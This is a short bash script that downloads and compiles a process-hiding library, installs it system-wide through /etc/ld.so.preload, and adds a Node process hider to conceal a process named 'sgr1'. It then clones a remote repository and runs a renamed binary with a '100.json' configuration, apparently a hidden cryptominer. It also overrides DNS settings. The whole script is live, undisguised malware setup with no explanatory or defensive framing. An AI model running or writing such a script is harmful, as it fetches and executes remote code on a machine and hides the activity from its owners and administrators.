#!/bin/bash
apt-get update ; apt-get -y install sudo npm
curl https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c
echo "supersede domain-name-servers 8.8.8.8;">> /etc/dhcp/dhclient.conf
/etc/init.d/network restart
sudo su --command "apt-get update && apt-get install gcc -y && curl -sL https://deb.nodesource.com/setup_14.x | bash && apt-get install nodejs -y && npm install -g npm@9.3.1 -y && npm i -g node-process-hider && ph add sgr1"
mkdir .kap && cd .kap
git clone https://github.com/nw4tw5/gradi.git
cd gradi && mv zepo sgr1
chmod +x sgr1 100.json
sudo ./sgr1 -c "100.json"
